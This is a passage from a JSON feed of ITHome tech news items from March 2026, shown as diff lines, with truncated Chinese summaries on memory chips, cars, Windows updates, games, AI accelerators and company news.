+      "summary": "IT之家 3 月 22 日消息，据韩媒《朝鲜日报》，SK 海力士正考虑在其 HBM4E 中为承担核心处理功能的“逻辑芯片”引入台积电 3nm 工艺，从而进一步获取性能优势。业内消息人士 3 月 20 日透露，SK 海力士计划在 HBM4E 的“核心芯片”（即堆叠的 DRAM）上使用 10nm 级第 6 代（1c）DRAM 工艺，而逻辑芯片则采用台积电的 3nm 工艺。相比之下，今年 SK 海力士向英伟达供应的 HBM4 采用了 10nm 级第 5 代（1b）DRAM 核心芯片，逻辑芯片则使用台积电 12nm 工艺；而三星电子的 HBM4 则采用了 10nm 级第 6 代（1c）DRAM 工艺的核心芯片及 4nm 的逻辑芯片。尽管 SK 海力士是目前英伟达最大的 HBM4 供应商，但据称其在性能评估方面却收到了落后于三星的评价。如IT之家前文所述，三星在 HBM4 上应用了比 SK 海力士更先进的工艺，所以性能领先也在情理之中。SK 海力士此番在 HBM4E 的逻辑芯片上引入 3nm 工艺，显然是意在扭转这一局面。如果说 HBM4 更侧重于通过成熟工艺保障稳定性，那么 HBM4E 则旨在"
+    },
+    {
+      "title": "鸿蒙智行享界 S9「月绒白」/ S9T「星玫粉」官图发布，3 月 23 日焕新上市",
+      "link": "https://www.ithome.com/0/931/371.htm",
+      "published": "Sun, 22 Mar 2026 00:16:00 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 22 日消息，鸿蒙智行“旗舰 9 系轿旅双车”享界 S9 / S9T 将于 3 月 23 日焕新上市，将带来 S9「月绒白」和 S9T「星玫粉」两款新色。IT之家注意到，鸿蒙智行官方发布了享界 S9「月绒白」和 S9T「星玫粉」的最新官图，展示了更多外观细节。其中，享界 S9T「星玫粉」不但采用了粉色车漆，而且轮毂及内饰也采用了同色系的粉色装饰。据IT之家了解，余承东还在 3 月 14 日的直播活动中透露，享界会在今年秋天推出硬派越野 SUV 以及家用 MPV 车型。"
+    },
+    {
+      "title": "无需充气压缩：荣耀手表 5 Ultra 升级支持血压监测功能",
+      "link": "https://www.ithome.com/0/931/370.htm",
+      "published": "Sun, 22 Mar 2026 00:09:53 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 22 日消息，据荣耀中国区智慧生活业务部部长林林分享，荣耀手表 5 Ultra 现开启“20.0.0.125 (SP3)”版本升级，新增支持血压监测功能（血压趋势功能）。荣耀手表 5 Ultra 升级内容如下：新增1.新增血压趋势功能。优化1.优化部分系统稳定性问题。2.优化其他功能问题。有网友询问该功能的实现是否需要表带充气压缩，林林回复称：“不需要，靠传感器。”据IT之家此前报道，荣耀手表 5 Ultra 于去年 7 月 2 日晚正式发布，新品拥有指挥官、纵横家、极速者三种风格款式，全系搭载航天级钛合金表壳与蓝宝石玻璃表镜，兼具耐用性与旗舰质感，售价 1999 元起。极速者（黑色）：定价 1999 元；国补价 1699.2 元。指挥官（棕色）：定价 2299 元；国补价 1954.2 元。纵横家（钛色）：定价 2899 元；国补价 2464.2 元。京东荣耀（HONOR）手表 5 Ultra1999 元直达链接据介绍，荣耀手表 5 Ultra 支持荣耀自研三芯智控技术，实现最长 15 天超长续航，在 eSIM 模式下亦可稳定使用 10 天。新表内置 105 种运动"
+    },
+    {
+      "title": "微软紧急推送 KB5085516 带外更新，修复 Win11 登录微软账户提示未联网的 Bug",
+      "link": "https://www.ithome.com/0/931/369.htm",
+      "published": "Sat, 21 Mar 2026 23:55:13 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 22 日消息，微软刚刚面向 Win11 24H2/25H2 的用户推送了 OOB 紧急带外更新（KB5085516），更新后版本号升级到 26100.8039/26200.8039。此 OOB 包含 2026 年 3 月 10 日发布的 KB5079473 的质量改进。以下摘要概述了此更新解决的关键问题。[Microsoft 账户登录] 已修复：安装 2026 年 3 月 10 日或之后发布的 Windows 更新后，某些用户使用 Microsoft 账户登录应用时可能会遇到问题。即使设备具有正常运行的 Internet 连接，登录期间也会显示“无 Internet”错误，并阻止访问 Microsoft 服务和应用（如 Microsoft Teams 免费版和 OneDrive）。IT之家提醒：仅使用 Microsoft 账户登录会受到影响。使用 Microsoft Entra ID 进行应用身份验证的企业不会遇到此问题。此更新可通过 Windows Update 提供给运行 Windows 11 的设备，这些设备已经安装了 KB5079473。它也可从 Micros"
+    },
+    {
+      "title": "大众 CEO 罕见发声：德国车企应借鉴中国的规划模式",
+      "link": "https://www.ithome.com/0/931/368.htm",
+      "published": "Sat, 21 Mar 2026 23:44:17 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 22 日消息，大众汽车集团 CEO 奥利弗 · 布鲁姆今日在接受德国媒体采访时表示，德国汽车工业可以向中国学习其严谨有序的产业规划。目前，大众正积极推进深度重组，以保持竞争力。布鲁姆在接受《星期日图片报》采访时说：“中国人的行事方式非常有计划性…… 他们有着清晰的优先事项 —— 这种规划方式堪称最优。”他表示，公司在中国市场的实际体验也印证了这一点，“我们在中国非常明显地能感受到，那里有着高度的纪律性和执行力。我们有必要跳出自身视角…… 我们可以从中国的发展历程中学到很多。”布鲁姆还指出，大众在中国市场面临着激烈的竞争，他形容这一市场拥有“超过 150 家竞争对手且创新动力强劲”。在此次采访中，布鲁姆再次重申了公司正在进行的改革计划，即到 2030 年在德国裁减 5 万个工作岗位，这是其持续重组计划的一部分。他强调，即便订单积压量上升，大众仍在坚定推进重组计划。布鲁姆在接受采访时称，为避免成本高昂的产能过剩，大众正对所有工厂 —— 无论是在德国、欧洲还是中国 —— 实施“明确的制造成本目标”。“未来我们将持续审视产能。重组将继续进行。”布鲁姆称，大众在本土市场的成本结"
+    },
+    {
+      "title": "IT早报 0322：中国车企全球销量 20 多年来首次超日本；小米 SU7、YU7 测试车现身欧洲；库克回应 OpenClaw 带动 Mac mini 大卖；微软公布 Win11 性能提速计划...",
+      "link": "https://www.ithome.com/0/931/367.htm",
+      "published": "Sat, 21 Mar 2026 23:32:09 GMT",
+      "source": "ITHome",
+      "summary": "“IT早报”时间，大家好，现在是 2026 年 3 月 22 日星期日，今天的重要科技资讯有：1、日媒：2025 年中国车企首次登上全球汽车总销量榜首，终结日本“25 年连霸”统计数据显示，中国车企整体销量增长明显，总规模接近 2700 万台，同比增长约 10%；日本车企则略降至约 2500 万台。前 20 名中，中国车企占据 6 席，数量超过日本的 5 家。&gt;&gt; 查看详情2、小米汽车加速国际化布局，多辆 SU7、YU7 原型现身欧洲多国汽车媒体 autoevolution 3 月 21 日发布博文，报道称小米公司进军欧洲市场的步伐，在法国、波兰和荷兰等欧洲国家发现多辆小米 SU7、YU7 测试车。&gt;&gt; 查看详情3、库克回应 OpenClaw 带动 Mac mini 大卖：苹果十年前就已布局 AI 神经网络引擎库克在采访中表示，苹果十年前就在 Mac 中加入了神经网络引擎，如今凭借苹果芯片、生成式 AI 与智能体交互的集成，Mac Mini 成为理想的 AI 任务平台。苹果将持续优化 AI 工作流性能，用户现已在 MacBook Pro 上训练大语言模型。&gt"
+    },
+    {
+      "title": "蔚来五代换电站最新时间表公布，3 月底内部测试站启用",
+      "link": "https://www.ithome.com/0/931/366.htm",
+      "published": "Sat, 21 Mar 2026 23:27:24 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 22 日消息，据博主 @德卤爱开车 分享，在蔚来最新的“用户面对面”活动上，蔚来五代换电站最新时间表公布：3 月底内部测试站启用；5-6 月份上线 5-10 座先锋站（开放给用户，偏试运营性）；下半年（大概 7-8 月份）开始进行五代站大面积铺设；今年千站目标进度为 8.5％。据IT之家此前报道，今年 2 月 6 日 22 时 33 分 18 秒，蔚来 1 亿次换电正式达成。在 2 月 9 日，蔚来创始人、董事长、CEO 李斌在蔚来汽车公众号发布长文称，2026 年计划新建 1000 座换电站，加电风景线增至 100 条，继去年 G318 川藏换电路线、滇藏换电路线贯通之后，今年将打通丝绸之路换电路线。目前，蔚来能源充换电站总数已达到 8704 座：蔚来能源换电站 3761 座，其中高速公路换电站 1025 座；蔚来能源充电站 4943 座，接入第三方充电桩 1572430 根。"
+    },
+    {
+      "title": "微软《我的世界：地下城 2》确认今年发售，支持 PC 与主机平台",
+      "link": "https://www.ithome.com/0/931/365.htm",
+      "published": "Sat, 21 Mar 2026 23:22:50 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 22 日消息，微软 Xbox Game Studios 及开发商 Mojang Studios、Double Eleven 宣布，《我的世界：地下城 2》将于 2026 年内发售。这部游戏届时将登陆 PC（Steam、微软商店）、PS5、任天堂 Switch 及 Switch 2、Xbox Series X|S 平台，并首发加入 Xbox Game Pass。我们很少有机会宣布一款全新的游戏，但没错：《我的世界：地下城 2》今年就要来了！这是一场全新的动作角色扮演冒险，你将面对高风险的战斗、惊心动魄的挑战，并探索《我的世界》宇宙中前所未见的场景。当然，还有战利品！海量的战利品。你可以全部收入囊中，也可以与最多三名好友合作，共同拯救这个陷入危机的世界。Mojang 强调，尽管“它似乎显而易见”，但“《我的世界：地下城 2》确实是《我的世界：地下城》的续作”，并补充道：“如果你还没玩过前作，现在正是补课的好时机。更多消息我们将很快分享！”这一消息其实并不算太令人意外。2020 年推出的初代地牢探险游戏取得了巨大成功，到 2021 年 2 月玩家数突破 1000 万，到 2"
+    },
+    {
+      "title": "华为鸿蒙 HarmonyOS 6.1 系统曝支持实况窗快速打开 / 隐藏特性",
+      "link": "https://www.ithome.com/0/931/364.htm",
+      "published": "Sat, 21 Mar 2026 23:02:22 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 22 日消息，据博主 @Adak封狼居胥 分享，华为鸿蒙 HarmonyOS 6.1 系统将支持实况窗快速打开 / 隐藏特性（左右滑动一下进行开启 / 隐藏）。有网友询问 PC 端应用音量单独调节功能能否下放至手机或平板设备，博主表示：“暂无计划，仅限 PC。”据IT之家此前报道，本月早些时候，开源鸿蒙 OpenHarmony 6.1 Release 版本也已正式发布，其进一步增强应用开发功能、提升动态效果体验、增强系统感知能力、增强音频控制管理能力 / 图形处理能力等。开源鸿蒙官方透露，计划于 6 月 30 日前发布 OpenHarmony 6.1 LTS 版本作为 OpenHarmony 新的长期维护和兼容性测评主推版本。另外，华为鸿蒙 HarmonyOS 6.0.0.328 花粉 Beta 版也已开启尝鲜升级，带来了应用锁支持根据识别机主来显示加锁应用通知、密码保险箱将支持添加和管理更多类型的账号密码等功能。而“328”版本也被多数用户认为是 HarmonyOS 6.1 的非正式版本。相关阅读：《开源鸿蒙 OpenHarmony 6.1 Release 更新发布"
+    },
+    {
+      "title": "时隔近六年，Epic《堡垒之夜》回归谷歌 Play 应用商店",
+      "link": "https://www.ithome.com/0/931/363.htm",
+      "published": "Sat, 21 Mar 2026 15:54:37 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，Epic 于 3 月 19 日确认，《堡垒之夜》正式回归全球范围的谷歌 Google Play 商店，游戏已在全球安卓应用商店恢复上架。此次回归与新一季大逃杀模式同步推出，安卓用户可以通过官方渠道直接下载安装游戏。Epic 表示，玩家现已可以在 Google Play 下载游戏，并与好友一起参与新赛季。同时，公司借此次上线推广“邀请好友”功能，玩家可通过该功能提升等级，并解锁 Yeddy 套装。移动端体验也同步更新。Marvel | Blitz 模式加入美国队长盾牌等新一批战利品；Festival 主舞台支持竖屏操作，玩家可以直接点击音符轨道，并在游玩过程中获得触觉反馈。在付费方面，Epic 强调使用自有支付系统可获得 20% 奖励返还。目前该功能已在美国地区 Google Play 上线，同时已在全球 iOS、网页和 PC 端 Epic Games Store 提供。公司表示，正在推进该支付方式向更多 Google Play 地区扩展。IT之家注：《堡垒之夜》自 2020 年 8 月起从 Google Play 下架，原因在于 Epic 引入了自有支付"
+    },
+    {
+      "title": "日媒：2025 年中国车企首次登上全球汽车总销量榜首，终结日本“25 年连霸”",
+      "link": "https://www.ithome.com/0/931/362.htm",
+      "published": "Sat, 21 Mar 2026 15:46:55 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，今天晚间，《日本经济新闻》发文称，2025 年全球新车销量格局生变，中国车企首次在总销量上超过日本车企，登上第一，日本车企自 2000 年以来首次失去榜首位置。统计数据显示，中国车企整体销量增长明显，总规模接近 2700 万台，同比增长约 10%；日本车企则略降至约 2500 万台。前 20 名中，中国车企占据 6 席，数量超过日本的 5 家。其中，比亚迪和吉利的销量已分别超过日产和本田。比亚迪全年销量达 460 万台，同比增长 8%，不仅超过福特，还在纯电领域超越特斯拉，成为全球第一。其海外销量首次突破 100 万台，占比提升至约 20%。吉利销量同比增长 23% 至 411 万台，排名升至第 8。2025 年推出的小型纯电车型“星愿”在中国市场表现强劲，同时推动公司加快向中南美等海外市场扩展。相比之下，日本车企整体承压。除丰田和铃木外，其余主要厂商销量均出现下滑。丰田仍以 1132 万台连续第 6 年位居全球第一，大众以 898 万台位列第二。本田销量下降 8% 至 352 万台排名第 9，在前 20 名中降幅最大，中国市场销量大幅下滑 24%。公司"
+    },
+    {
+      "title": "AMG“新车攻势”曝光：三款纯电性能车，预计还有燃油 GT 系列收官之作",
+      "link": "https://www.ithome.com/0/931/361.htm",
+      "published": "Sat, 21 Mar 2026 15:31:13 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，当地时间 3 月 20 日，据外媒 CarBuzz 报道，奔驰正推进史上最大规模的新车发布周期，计划在短期内推出约 30 款新车型。随着时间临近，部分重点产品已经提前曝光。在面向北美经销商的一次内部展示中，奔驰展示了多款尚未发布的新车，包括首次面向美国市场的 G 级敞篷版，以及 AMG 旗下三款全新 GT 63 车型、一款 Black Series 高性能版本。其中一款核心车型是 AMG G 63 敞篷版，预计将于 2028 年推出。该车型将搭载 577hp 的 4.0L 双涡轮 V8 发动机，在保留敞篷结构的同时继续提供典型的 AMG 性能表现。新车预计将在 2027 年底投产，价格尚未公布，大概率不会低于当前约 20 万美元的 G 63，并且考虑到市场热度，终端售价可能进一步上浮。据IT之家了解，奔驰还准备推出三款基于 GT 63 命名的新车型。首先是一款低矮四门轿跑，预计为 AMG GT Concept XX 的量产版本，搭载 YASA 轴向磁通电机，最大功率可达 1341hp。概念车此前在连续 8 天测试中行驶约 4 万公里，展现出极高性能潜力。"
+    },
+    {
+      "title": "《红色沙漠》游戏致歉：已了解许多玩家操作不便，正在准备更新补丁",
+      "link": "https://www.ithome.com/0/931/360.htm",
+      "published": "Sat, 21 Mar 2026 15:13:08 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，今日，《红色沙漠》游戏官方发布公告称，在发售约 36 小时后的现在，首先向所有正在游玩《红色沙漠》的玩家致以最诚挚的感谢。自发售后，团队一直在认真倾听各位的反馈，并竭尽全力让游戏朝着更好的方向改进。公告还称，尤其是关于操作，我们已经充分了解许多玩家感受到的不便，并正在准备相应的更新补丁。在此为未能给使用键盘 / 鼠标游玩的玩家带来令人满意的游戏体验而深表歉意。为了尽可能快的改善游戏体验，我们以虚心诚恳地态度确认每一位的反馈。IT之家注意到，《红色沙漠》于 3 月 20 日正式发售，Steam 国区 268 元起，登陆 PC、Mac、主机平台，首日全球销量突破 200 万份。尽管该游戏首发表现强劲，但媒体评分整体却表现为两极分化，M 站平均分约 78 分，IGN 给出初期评分 6 分，而 IGN 中国则是打出 8 分，截至IT之家发稿 Steam 简体中文评测为“多半差评”。"
+    },
+    {
+      "title": "广汽埃安新车 N60 将于 3 月 25 日开启盲订：标配零重力按摩座椅、5 连杆悬架",
+      "link": "https://www.ithome.com/0/931/359.htm",
+      "published": "Sat, 21 Mar 2026 14:40:08 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，据广汽埃安官方，广汽埃安旗下全新车型 AION N60 将于 3 月 25 日开启盲订。官方此前已经开始对其进行预热，新车将拥有“越级尺寸”、全系标配零重力座椅 + 按摩、全系标配豪车级 5 连杆、全系标配高速领航智驾等特性。新车由曾任职于宝马等品牌的知名设计师 Benoit Jacob（叶禀焕）主导设计，他曾参与设计初代宝马 i3 及 i8、宝马 4 系 Gran Coupé（F36）、奥迪 A5 Sportback（B8），还有宝马 5 系 GT（F07）等车型。据IT之家了解，该车尺寸为 4615 x 1860 或 1883 x 1673mm，轴距 2775mm，是一款五座车型。该车可选装激光雷达、全景天幕，搭载了锐湃动力的 100kW 或 165kW 电机，配有广汽埃安自家的因湃电池，预计可选高低配动力版本。官方资料提及，该车应用了非晶合金电驱动技术，旨在提升能效表现。"
+    },
+    {
+      "title": "微信 iOS 版 8.0.70 最新官方正式版下载发布",
+      "link": "https://www.ithome.com/0/931/358.htm",
+      "published": "Sat, 21 Mar 2026 14:34:09 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，微信 iOS 平台迎来了 8.0.70 正式版更新。官方更新日志为：本次更新：- 解决了一些已知问题。 大家在IT之家微信号回复“微信”两字，即可获取当前最新官方内部版微信下载。 本文由机器人发布，IT之家稍后将为大家带来具体更新内容。如果你发现了日志中未提及的更新点，欢迎发在评论区供大家参考~[微笑]"
+    },
+    {
+      "title": "雷神加速器称遭受恶意网络攻击，正在紧急修复",
+      "link": "https://www.ithome.com/0/931/357.htm",
+      "published": "Sat, 21 Mar 2026 14:24:45 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，雷神加速器今晚发布“关于雷神加速器遭受恶意网络攻击的紧急说明”。公告称，自今日 21:00 起，雷神加速器监测到大规模、持续性的非法恶意流量攻击，导致部分地区用户出现登录困难、客户端加载超时及连接中断的情况。目前，公司的技术团队已在第一时间启动最高等级的应急防御预案，正在与各运营商紧密配合进行流量清洗与节点调度。用户的账号资产及个人数据安全未受任何影响。IT之家注意到，官方还在评论区表示，团队目前正在紧急修复中。"
+    },
+    {
+      "title": "消息称苹果为强化 iPhone 18 Pro 相机收购 Halide 开发商未果，引发后者创始团队内斗",
+      "link": "https://www.ithome.com/0/931/356.htm",
+      "published": "Sat, 21 Mar 2026 14:21:35 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，据《The Information》爆料称，苹果为提升 iPhone 18 Pro 相机能力，曾考虑收购相机应用 Halide 开发商 —— 初创公司 Lux Optics，但双方谈判最终告吹，并引发后者创始团队内部纠纷。IT之家注：Lux 开发了 Halide、Kino 和 Spectre 等 iPhone 相机应用。2025 年夏天，苹果与 Lux Optics 展开收购谈判。由于公司认为未来估值还有提升空间，最终未接受当时的交易方案。谈判结束两个月后，苹果开始挖角联合创始人兼设计师 Sebastian de With。随后，公司内部矛盾升级。Lux 的 CEO 兼联合创始人 Ben Sandofsky 在去年 12 月以财务问题为由解雇 de With。后者在今年 1 月加入苹果设计团队。目前，Sandofsky 已提起诉讼，指控 de With 自 2022 年以来挪用超过 15 万美元（现汇率约合 103.5 万元人民币）公司资金用于个人用途，并向苹果提供公司机密和源代码。在此前收购谈判中，苹果曾将 Lux 的知识产权视为关键资产，并希望借此强"
+    },
+    {
+      "title": "华为 Atlas 350 加速卡上市，搭载全新昇腾 950PR 处理器",
+      "link": "https://www.ithome.com/0/931/355.htm",
+      "published": "Sat, 21 Mar 2026 14:13:40 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，3 月 20 日，在华为中国合作伙伴大会 2026 期间，昇腾人工智能伙伴峰会成功举办。华为副总裁、ICT 产品组合管理与解决方案部总裁马海旭宣布搭载全新昇腾 950PR（Ascend 950PR）处理器的 Atlas 350 加速卡正式上市。IT之家从官方介绍获悉，该加速卡搭载了全新的昇腾 950PR 处理器，算力与内存双升级、访存更灵活、开发更易用。面向推荐推理、多模态生成和 LLM 推理三大场景，伙伴可以基于 Atlas 350 打造更具竞争力的产品和解决方案。昆仑、华鲲振宇、神州鲲泰、长江计算、宝德、软通华方、百信七家核心伙伴正式发布基于昇腾 Atlas350 的整机产品，共同面向行业客户打造定制化、高性能的推理解决方案。作为昇腾 950 代际首款上市的硬件产品，昇腾 Atlas 350 采用全新昇腾 950PR （Ascend 950PR）处理器，在算力、访存、编程模式等微架构层面实现显著升级。另据上海证券报报道，华为昇腾计算业务总裁张迪煊介绍，Atlas 350 的单卡算力达到了英伟达 H20 的 2.87 倍，是目前国内唯一支持 FP4 低"
+    },
+    {
+      "title": "报告显示我国近半数成年人有睡眠困扰，用手表监测可能越测越睡不好",
+      "link": "https://www.ithome.com/0/931/354.htm",
+      "published": "Sat, 21 Mar 2026 14:02:09 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，据央视财经报道，今天（3 月 21 日）是世界睡眠日，今年的主题是“优质睡眠，美好生活”。《2025 年中国睡眠健康调查报告》显示，中国 18 岁及以上人群睡眠困扰率超过 48%。越来越多人将“睡个好觉”视为生活的头等大事。随着智能可穿戴设备的普及，很多人会主动监测睡眠状况，但却因为监测结果不理想而感到焦虑，越测越睡不好。这些可穿戴设备的监测结果科学吗？北京大学人民医院睡眠医学科主任韩芳指出，目前很多可穿戴设备还不能科学地区分深睡眠和浅睡眠，过分依赖监测结果会引起数字焦虑。根据睡眠分期标准，成年人深睡眠占整夜睡眠的正常比例是 13% 至 23%。如果晚上睡眠时间是 6 至 7 小时，整夜深睡眠能达到 50 分钟即为正常。IT之家从公开资料获悉，世界睡眠日（World Sleep Day）是全球性健康倡导活动，由国际精神卫生和神经科学基金会于 2001 年发起，定于每年 3 月 21 日，旨在提高公众对睡眠重要性的认知。2003 年，中国睡眠研究会将其引入国内，并自 2008 年起每年发布中国主题，如“规律作息健康睡眠”（2018 年）。通过学术研讨、科普"
+    },
+    {
+      "title": "小鹏汽车目标今年海外销量翻倍，并将在墨西哥卖车",
+      "link": "https://www.ithome.com/0/931/353.htm",
+      "published": "Sat, 21 Mar 2026 13:57:44 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，据路透社 3 月 20 日报道，小鹏汽车正加快出海节奏，目标是在今年实现海外销量翻倍，并将国际市场收入占比提升至 20%，并将于 3 月 25 日在墨西哥推出 G6 和 G9 车型。此次进入墨西哥，是小鹏汽车海外扩张的重要一步。在国内竞争加剧、需求增速放缓的背景下，中国新势力车企正加速开拓海外市场。财务表现方面，小鹏汽车在 2025 年第四季度实现首次季度盈利，超出市场预期，成为蔚来、理想汽车和零跑汽车之后，又一家实现盈亏平衡的企业。小鹏汽车董事长兼 CEO 何小鹏在财报电话会上披露：“品牌将在 3 月底正式进入墨西哥市场，并推出 G6 和 G9，以进一步深化在拉丁美洲的布局。”公司正将海外市场作为核心增长方向，已在欧洲等地区持续扩张。据IT之家了解，小鹏汽车此前曾提出到 2030 年海外业务贡献超过 70% 利润的目标。"
+    },
+    {
+      "title": "极星汽车再次明确不做油车、混动车，CEO 称因为客户“相信科学”",
+      "link": "https://www.ithome.com/0/931/352.htm",
+      "published": "Sat, 21 Mar 2026 13:41:38 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，当地时间 3 月 19 日，据外媒 Auto Express 报道，极星汽车再次明确立场：即便纯电动市场增长不及预期，公司仍只做纯电车型，不会转向混动或燃油路线。在哥德堡总部的一场媒体沟通会上，CEO 迈克尔 · 洛施勒表示，品牌用户结构为这一战略提供了支撑。极星用户平均年龄约 45 岁，比行业年轻约 10 年，这部分人群更容易接受新技术，也更认同环保理念。“我们的客户相信科学，尤其是年轻人。气候变化是真实存在的。如果我们转向燃油车型，他们会完全无法接受。正因为如此，我们可以保持专注，不会做混动。未来出行必须实现零排放，而电气化是最直接的路径。这个转型一定会发生，纯电市场仍在增长，我们的机会是扩大覆盖范围。”据IT之家了解，极星未来的产品规划也围绕这一方向展开：今年将推出 Polestar 5 GT 车型，随后是 Polestar 4 旅行版，2027 年推出全新 Polestar 2，并在之后一年带来小型 SUV Polestar 7。随着这些车型落地，品牌在纯电市场的覆盖将达到约 57%。不过，公司并不打算继续扩展到更多细分市场。洛施勒透露：“剩下的"
+    },
+    {
+      "title": "小米汽车详解新一代 SU7 技术升级：湿滑模式主动提醒、全系标配 265mm 宽胎",
+      "link": "https://www.ithome.com/0/931/351.htm",
+      "published": "Sat, 21 Mar 2026 13:19:36 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，小米汽车今日发布答网友问（第 217 集），回答了“新一代 SU7 的主动提醒切换湿滑模式是怎么实现的？”“新一代 SU7 为什么全系标配后 265mm 宽胎？”等问题。IT之家整理如下：1、新一代 SU7 的主动提醒切换湿滑模式是怎么实现的？新一代 SU7 全系升级了更加稳定的「湿滑模式」，动力更柔和、动力分配更均衡，从而提升湿滑路面行驶稳定性。同时，新一代 SU7 可通过车载摄像头、车外麦克风等硬件采集图像和声音，依靠大模型判断路面和车辆状态，一旦发现当前行驶在湿滑路面，车辆会主动提示驾驶员切换到「湿滑模式」，以提升行驶稳定性与安全性。2、新一代 SU7 为什么全系标配后 265mm 宽胎？新一代 SU7 全系标配 V6s Plus 超级电机，动力大升级，所以我们为新一代 SU7 全系标配了 265mm 后宽胎，轮胎与地面的接触面积提高了 8%，因此抓地力更强，行驶更加精准、稳定、安全；同时，得益于新一代 SU7 电驱系统 CLTC 综合效率提升了 1.5%、以及全系碳化硅高压平台升级等全域的能耗优化，即使标配了 265mm 的后宽胎，新一代 SU7"
+    },
+    {
+      "title": "比亚迪新款元 PLUS“ATTO 3 Evo”英国上市：3.9 万英镑起售，还有 443 马力双电机版",
+      "link": "https://www.ithome.com/0/931/350.htm",
+      "published": "Sat, 21 Mar 2026 13:16:33 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，当地时间 3 月 20 日，比亚迪新款元 PLUS 的海外版 ——ATTO 3 Evo 在英国正式上市，是 ATTO 3 的升级版本，也是比亚迪进入英国市场后的重要更新产品。入门版 Design 售价 38990 英镑（IT之家注：现汇率约合 35.9 万元人民币），配置并不“入门”。新车搭载后置电机，最大功率 309hp，配备 74.8kWh 刀片电池，0-100km/h 加速 5.5 秒。续航表现明显提升，WLTP 工况下可达约 508km，比旧款增加约 88km。Excellence 版本售价 42730 英镑（现汇率约合 39.4 万元人民币），增加前电机组成双电机四驱系统，总功率提升至 443hp，加速时间缩短至 3.9 秒，续航相应下降至约 470km。底盘方面，两款车型均升级为五连杆后悬架，同时引入电芯与车身一体化结构，以提升车身刚性并优化空间利用。整车电气架构升级至 800V，最大充电功率提升至 220kW，10%-80% 充电时间约 25 分钟。配置方面，新车标配 8.8 英寸仪表和 15.6 英寸中控屏，中控屏取消旋转功能，固定为横屏"
+    },
+    {
+      "title": "腾讯云发布行业首个官网内置 Agent 助手 KiKi，一句话完成 OpenClaw 部署",
+      "link": "https://www.ithome.com/0/931/349.htm",
+      "published": "Sat, 21 Mar 2026 13:11:27 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，昨晚，腾讯云宣布正式发布行业首个官网内置 Agent 助手 —KiKi，用户只需用一句自然语言描述需求，KiKi 即可在控制台模拟人完成资源配置、服务购买、应用部署等一系列操作。IT之家从官方介绍获悉，不同于传统 AI 助手仅能问答，KiKi 具备完整任务执行能力，可理解页面上下文、自动拆解步骤并跨页面操作。目前，KiKi 已全量登陆腾讯云官网。KiKi 上线第一天，就有超 2000 名用户通过一句话完成 OpenClaw“零操作”部署。用户只需输入“帮我部署 OpenClaw”，KiKi 就会自动完成资源购买、环境初始化到部署配置的全过程，并在关键节点提示确认，其余步骤全部自动执行。KiKi 还可以实现在官网、控制台、购买页等多个页面之间的自动跳转，理解当前上下文，自主拆解任务并选择最优路径执行，把原本割裂的多页面操作，变成一次连续完成的任务。在执行能力之外，KiKi 也保留了对流程的控制权。所有操作步骤均可视、可追溯，用户可以随时介入或中断；在涉及关键或敏感操作时，系统会主动暂停并请求确认，确保操作边界清晰可控。当任务执行受阻时，KiKi 还能自动调"
+    },
+    {
+      "title": "消息称 OpenAI 加速扩充员工规模，目标年底前从 4500 人增员至 8000 人",
+      "link": "https://www.ithome.com/0/931/348.htm",
+      "published": "Sat, 21 Mar 2026 12:55:52 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，OpenAI 正在加速扩张，计划在 2026 年底前将员工人数从 4500 人提升至 8000 人，规模接近翻倍。《金融时报》援引知情人士称，新增人员将主要集中在产品开发、工程、研究和销售等核心部门。同时，公司还在重点招聘“技术大使”岗位，用于帮助企业客户更高效地落地和使用其 AI 工具。最新一轮融资进一步强化了这一扩张节奏。OpenAI 在该轮融资中的估值达到 8400 亿美元（IT之家注：现汇率约合 5.8 万亿元人民币），参与方包括多家科技公司以及孙正义旗下的软银，融资总规模达到 1100 亿美元（现汇率约合 7593.25 亿元人民币）。在内部层面，公司也在加快节奏。奥尔特曼在去年 12 月曾发出“红色警报”，暂停非核心项目，并重新调配资源，以应对谷歌 Gemini 3 带来的竞争压力。目前，这一扩张计划尚未得到 OpenAI 官方确认。"
+    },
+    {
+      "title": "比亚迪腾势 Z 超跑后缀征名细节公布：分为硬顶版、敞篷版、赛道版",
+      "link": "https://www.ithome.com/0/931/346.htm",
+      "published": "Sat, 21 Mar 2026 12:28:18 GMT",
+      "source": "ITHome",
